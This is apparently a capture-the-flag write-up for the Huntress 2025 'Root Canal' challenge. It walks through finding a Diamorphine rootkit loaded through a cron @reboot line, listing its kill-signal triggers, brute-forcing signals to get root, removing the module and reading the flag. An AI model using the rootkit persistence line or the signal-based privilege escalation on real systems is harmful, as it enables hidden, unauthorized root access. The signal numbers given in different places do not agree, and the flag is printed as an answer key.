---
title: "Huntress_2025 – Root_Canal"
layout: post
competition: Huntress_2025
challenge: Root_Canal
---

# 📦 Root Canal

|Category         |	Author                |
|-----------------|-----------------------|
|📦 Miscellaneous |Matt Kiely (HuskyHacks)|

## Challenge Prompt

But what is the real root of the issue?

## Problem Type
- “Diamorphine” Rootkit
- [Diamorphine Rootkit GitHub](https://github.com/m0nad/Diamorphine)

## Solve

SSH to challenge, found README.txt
```bash
cat README.txt
once you fix your root your root canal, you’ll see a new directory here!
Do some reconnaissance and you’ll find the real root of the issue.
```

Checked cron: 
```bash
ctf@ip-10-1-113-7:~$ ls -la /etc/cron.*
/etc/cron.d: total 20
drwxr-xr-x 2 root root 4096 Sep 26 14:12 .
drwxr-xr-x 88 root root 4096 Oct 31 15:05 ..
-rw-r--r-- 1 root root 177 Sep 26 14:17 diamorphine
-rw-r--r-- 1 root root 589 Jan 14 2020 mdadm
-rw-r--r-- 1 root root 102 Nov 16 2017 .placeholder
```

/etc/cron.d/diamorphine runs a kernel module at reboot:
```bash
ctf@ip-10-1-113-7:~$ cat /etc/cron.d/diamorphine
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
@reboot root cp -a /opt/.diamorphine/. /dev/shm/ && insmod /dev/shm/diamorphine.ko || true
```

Found the kernel module diamorphine.ko in /opt/.diamorphine/

> Typical triggers for Diamorphine in CTFs:
> 
> |Action	        |Effect                              |
> |-----------------|------------------------------------|
> |kill -31 <pid>   |Hide/unhide process                 |
> |kill -63 <pid>	|Make the module become (in)visible  |
> |kill -64 <pid>	|Elevate to root when run as non-root|
> |Setting file UID	|Make binary auto-privileged         |


```bash
ctf@ip-10-1-113-7:~$ echo $$
763
ctf@ip-10-1-113-7:~$ kill -64 $$
Connection to 10.1.113.7 closed
```
That didn't work here, it caused the SSH session to crash.

We need to send signals without killing the session.
So don't send the signal to your own session.
Instead, spawn a dummy process and test signals on it.

```bash
sleep 99999 &
TESTPID=$!
echo $TESTPID
```

Then brute signal numbers to that PID:

```bash
for s in {1..200}; do
    kill -$s $TESTPID 2>/dev/null
done
```

Could have determined it was 11 & 12 by looking at compare "`cmp`" functions:
```bash
objdump -D /opt/.diamorphone/diamorphine.ko | grep "cmp"
cmp $0xc,%eax (line 4bd) - checks if signal is 12 (0xc in hex)
cmp $0xd,%eax (line 4c6) - checks if signal is 13 (0xd in hex)
cmp $0xb,%eax (line 4cb) - checks if signal is 11 (0xb in hex)
```


Then check if you got root:

```bash
ctf@ip-10-1-113-7:~$ whoami
root
ctf@ip-10-1-113-7:~$ id
uid=0(root) gid=0(root) groups=0(root),1001(ctf)
```


Checked the kernel module
```bash
ctf@ip-10-1-113-7:/root/snap$ lsmod | grep -i dia
diamorphine 16384 0
```
Module was still loaded
Removed it to disable the rootkit:
```bash
ctf@ip-10-1-113-7:/root/snap$ rmmod diamorphine 
```

Also commented out the commands in the cron job with "#" (this wasn't needed):
```bash
ctf@ip-10-1-113-7:/root/snap$ sudo nano /etc/cron.d/diamorphine 
```

After removal, hidden directories and files became visible to root.
Saw a directory squiblydoo with no permissions (d---------).

Normally, even root couldn’t cd into it.

Used sudo chmod 777 squiblydoo to give full access.
```bash
ctf@ip-10-1-113-7:~$ sudo chmod 777 squiblydoo/
ctf@ip-10-1-113-7:~$ cd squiblydoo/
ctf@ip-10-1-113-7:~/squiblydoo$ ls -la
total 12
drwxrwxrwx 2 root root 4096 Sep 26 14:12 .
drwxr-xr-x 6 ctf ctf 4096 Sep 26 14:19 ..
---------- 1 root root 39 Sep 26 14:12
flag.txt
```
Then cd squiblydoo worked, revealing flag.txt.
```bash
ctf@ip-10-1-113-7:~/squiblydoo$ cat flag.txt
```

## Flag

`flag{ce56efc41f0c7b45a7e32ec7117cf8b9}`

<p align="right">(<a href="#top">back to top</a>)</p>
